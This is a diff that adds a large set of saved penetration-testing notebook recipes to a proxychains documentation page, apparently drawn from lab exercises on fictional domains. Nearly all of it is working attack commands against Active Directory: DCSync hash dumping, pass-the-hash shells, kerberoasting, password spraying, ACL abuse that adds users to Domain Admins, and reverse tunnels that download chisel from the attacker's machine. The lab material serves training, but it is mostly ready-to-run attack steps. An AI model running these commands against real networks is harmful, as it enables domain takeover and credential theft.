@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=proxychains) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,493 @@ Configure the running SOCKS proxy in /etc/proxychains4.conf first; use the saved
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=proxychains)
+## Notebook recipes
 
-## Learning and original examples
+31 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Proxychains and SSH Tunnels](/pivoting/proxychains)
+<AccordionGroup>
+
+<Accordion title="10. Domain compromise (DCSync)">
+
+### 10. Domain compromise (DCSync)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Q1 — the Administrator NTLM hash
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11 -just-dc-user Administrator
+#   -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
+
+# full domain (krbtgt = Golden Ticket persistence, + every account)
+proxychains impacket-secretsdump 'nexura.htb/stom:calves-warp-learning1'@172.16.119.11
+proxychains nxc smb 172.16.119.11 -u stom -p 'calves-warp-learning1' --ntds
+
+# command execution on the DC (the objective)
+proxychains evil-winrm -i 172.16.119.11 -u stom -p 'calves-warp-learning1'
+# or Pass-the-Hash as Administrator:
+proxychains evil-winrm -i 172.16.119.11 -u Administrator -H <NTHASH>
+```
+
+</Accordion>
+
+<Accordion title="6. Internal AD enumeration">
+
+### 6. Internal AD enumeration
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# valid? local admin anywhere? (look for (Pwn3d!))
+proxychains nxc smb 172.16.119.10 172.16.119.11 172.16.119.7 -u hwilliam -p 'dealer-screwed-gym1'
+# users / shares / policy
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --users | tee users.txt
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --shares
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' -M spider_plus     # file inventory -> ~/.nxc/.../<ip>.json
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' --pass-pol
+# roasting (Password Attacks bread-and-butter)
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --kerberoasting kerb.txt
+proxychains nxc ldap 172.16.119.11 -u bdavid -p '...' --asreproast asrep.txt
+# SYSVOL GPP passwords
+proxychains nxc smb 172.16.119.11 -u bdavid -p '...' -M gpp_password
+# BloodHound (see the dedicated BloodHound cheatsheet)
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+# fast ACL check without the GUI:
+proxychains bloodyAD --host 172.16.119.11 -d nexura.htb -u bdavid -p '...' get writable
+```
+
+</Accordion>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="Option A — chisel + proxychains (SOCKS)">
+
+### Option A — chisel + proxychains (SOCKS)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali (attacker)
+./chisel server -p 9001 --reverse
+# DMZ01 (pull binary via your http server first)
+wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client <KALI>:9001 R:1080:socks
+# Kali: /etc/proxychains4.conf  ->  socks5 127.0.0.1 1080
+proxychains nxc smb 172.16.119.11 -u user -p pass
+```
+
+</Accordion>
+
+<Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+sudo ./proxy -selfcert            # listens :11601
+# DMZ01
+./agent -connect <KALI>:11601 -ignore-cert
+# Kali (in proxy console type `start`, then add the route)
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now tools work WITHOUT proxychains:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
+```
+
+</Accordion>
+
+<Accordion title="Collecting over a pivot">
+
+### Collecting over a pivot
+
+**BloodHound: Full Reference**
+
+```bash
+# SOCKS proxy must be up; DNS must reach the DC -> use --dns-tcp
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+```
+
+</Accordion>
+
+<Accordion title="Group → DCSync chain (what we&#x27;d have done with bdavid if those edges were outbound)">
+
+### Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)
+
+**BloodHound: Full Reference**
+
+```bash
+# 1. add yourself to a powerful group (GenericAll/AddMember on it)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add groupMember "Domain Admins" <you>
+# 2. or grant DCSync rights directly (WriteDacl on the domain)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <you>
+# 3. then replicate
+proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
+```
+
+</Accordion>
+
+<Accordion title="No‑GUI shortcut: bloodyAD">
+
+### No‑GUI shortcut: bloodyAD
+
+**BloodHound: Full Reference**
+
+```bash
+pipx install bloodyAD
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable     # what you can modify
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr memberOf
+```
+
+</Accordion>
+
+<Accordion title="The three reusable &quot;I control a user&quot; primitives">
+
+### The three reusable "I control a user" primitives
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <target> 'Newpass123!'
+# or:  net rpc password <target> 'Newpass123!' -U '<domain>/<you>%<pass>' -S <DC>
+```
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains certipy shadow auto -u <you>@<domain> -p '<pass>' -account <target> -dc-ip <DC>
+#   -> prints the target's NT hash. (pywhisker + gettgtpkinit is the manual equivalent.)
+```
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains python3 targetedKerberoast.py -d <domain> -u <you> -p '<pass>' --request-user <target>
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Chisel: Quick Tunnel Reference">
+
+### Chisel: Quick Tunnel Reference
+
+**Chisel: Quick Tunnel Reference**
+
+```bash
+# Attacker = server (reverse SOCKS)
+./chisel server -p 8080 --reverse
+# Victim = client, opens a reverse SOCKS5 proxy back to you
+./chisel client ATTACKER:8080 R:socks
+# then route tools through 127.0.0.1:1080
+proxychains nxc smb 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="Mental model">
+
+### Mental model
+
+**Metasploit Framework: Startup to Sessions**
+
+```text
+Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
+No module, but can run a file? → msfvenom payload → multi/handler to catch it
+Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
+In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
+Need the internal net? → autoroute + socks_proxy → proxychains everything else
+Always: LHOST = your tun0, payload in venom must match the handler
+```
+
+</Accordion>
+
+<Accordion title="Post-exploitation &amp; pivoting">
+
+### Post-exploitation & pivoting
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+meterpreter > run post/windows/gather/hashdump
+meterpreter > run post/multi/recon/local_exploit_suggester   # find privesc paths
+msf6 > use post/windows/manage/enable_rdp
+
+# Pivoting: route traffic through a compromised host to reach an internal subnet
+meterpreter > run autoroute -s 172.16.5.0/24
+msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
+```
+
+</Accordion>
+
+<Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
+
+### Step 5 — Transfer the ticket from LINUX01 to Kali
+
+**Pass the Ticket from Linux**
+
+```bash
+# [ON KALI] pull it THROUGH the tunnel (note proxychains + the internal IP)
+proxychains wget http://172.16.1.15:8080/krb5cc_647401106_8Dt6uj
+```
+
+</Accordion>
+
+<Accordion title="Step 6 — Load the ticket and run tools through proxychains">
+
+### Step 6 — Load the ticket and run tools through proxychains
+
+**Pass the Ticket from Linux**
+
+```bash
+export KRB5CCNAME=/tmp/ticket/krb5cc_647401106_8Dt6uj   # full path to the file you pulled; no FILE: prefix
+klist                                        # confirm it loaded and is still valid
+
+proxychains impacket-wmiexec dc01 -k         # -k = use Kerberos; target by NAME, not IP
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+</Accordion>
+
+<Accordion title="🔁 Mutating a known OLD password (the stom case)">
+
+### 🔁 Mutating a known OLD password (the stom case)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# 1. base word
+echo 'fails-nibble-disturb4' > base.txt
+# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
+# tight hand-list when lockout is a risk:
+printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
+  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
+# 3. spray the mutations (CAREFULLY — see lockout below)
+proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="🔒 Lockout discipline (don&#x27;t lock the account)">
+
+### 🔒 Lockout discipline (don't lock the account)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# read the policy BEFORE spraying
+proxychains nxc smb <DC> -u <valid_user> -p '<valid_pass>' --pass-pol
+```
+
+</Accordion>
+
+<Accordion title="Dynamic forwarding: -D">
+
+### Dynamic forwarding: -D
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+proxychains nmap -v -sT -Pn 172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="1. SSH port forwarding (no tools needed)">
+
+### 1. SSH port forwarding (no tools needed)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
+ssh -D 1080 jbetty@<DMZ_IP>
+#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
+proxychains nxc smb 172.16.119.11 -u user -p pass
+
+# Local (-L): map ONE internal service to a Kali local port (great for RDP)
+ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains
+
+# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
+ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
+```
+
+</Accordion>
+
+<Accordion title="2. chisel (SOCKS + port forwards)">
+
+### 2. chisel (SOCKS + port forwards)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Kali (server, reverse mode)
+./chisel server -p 9001 --reverse
+# pivot host (client) — reverse SOCKS:
+./chisel client <KALI_IP>:9001 R:1080:socks
+#   -> SOCKS5 on Kali 127.0.0.1:1080 ; use proxychains
+
+# single reverse port forward (e.g. expose internal RDP on Kali:13389):
+./chisel client <KALI_IP>:9001 R:13389:172.16.119.7:3389
+
+# forward a Kali service INTO the network (internal host can reach Kali:8000):
+./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000
+```
+
+</Accordion>
+
+<Accordion title="2 · Metasploit routing (pivot through a session)">
+
+### 2 · Metasploit routing (pivot through a session)
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+# through an existing meterpreter session:
+run autoroute -s 172.16.5.0/23         # or: post/multi/manage/autoroute (autoadd)
+route print                             # verify
+# now any msf module reaching 172.16.5.x goes through the session
+# expose those routes to EXTERNAL tools:
+use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
+# then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
+```
+
+</Accordion>
+
+<Accordion title="Dynamic port forwarding (-D) → SOCKS + proxychains">
+
+### Dynamic port forwarding (-D) → SOCKS + proxychains
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+ssh -D 9050 ubuntu@pivot           # SOCKS5 proxy on your 127.0.0.1:9050
+# /etc/proxychains4.conf → last line:  socks5 127.0.0.1 9050
+proxychains -q nmap -sT -Pn 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="Proxychains and SSH Tunnels">
+
+### Proxychains and SSH Tunnels
+
+**Proxychains and SSH Tunnels**
+
+```bash
+# /etc/proxychains4.conf  -> last line
+socks5 127.0.0.1 1080
+# use it
+proxychains -q nmap -sT -Pn 172.16.5.19
+proxychains -q nxc smb 172.16.5.0/24
+```
+
+</Accordion>
+
+<Accordion title="sshuttle: Route a Subnet over SSH">
+
+### sshuttle: Route a Subnet over SSH
+
+**sshuttle: Route a Subnet over SSH**
+
+```bash
+sshuttle -r ubuntu@pivot 172.16.5.0/23           # route that subnet over SSH
+sshuttle -r ubuntu@pivot 172.16.5.0/23 -x pivot  # exclude the pivot itself
+# now use tools normally — no proxychains:
+nmap -sT -Pn 172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="11. File transfer over a pivot">
+
+### 11. File transfer over a pivot
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
+
+```text
+proxychains impacket-smbserver
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting quick reference">
+
+### Troubleshooting quick reference
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: wget  to internal IP hangs/refused Kali can't reach internal net directly; or server on wrong host Run  python3 -m http.server  on the box with the file (LINUX01);  proxychains wget  from Kali; match ports
+
+```text
+proxychains wget
+```
+
+</Accordion>
+
+<Accordion title="proxychains config (/etc/proxychains4.conf)">
+
+### proxychains config (/etc/proxychains4.conf)
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  proxychains.conf . Comment out the default Tor  socks4 ... 9050  line. Use  socks5 , not  socks4 , for DNS + reliability. Usage:  proxychains &lt;tool> ... . Add  -q  to silence the chain spam:  proxychains -q nxc ... .
+
+```text
+proxychains <tool> ...
+```
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  proxychains.conf . Comment out the default Tor  socks4 ... 9050  line. Use  socks5 , not  socks4 , for DNS + reliability. Usage:  proxychains &lt;tool> ... . Add  -q  to silence the chain spam:  proxychains -q nxc ... .
+
+```text
+proxychains -q nxc ...
+```
+
+</Accordion>
+
+<Accordion title="4 · proxychains — the glue">
+
+### 4 · proxychains — the glue
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+Context from the notebook: proxychains -q  silences the per-connection chatter.
+
+```text
+proxychains -q
+```
+
+</Accordion>
+
+</AccordionGroup>
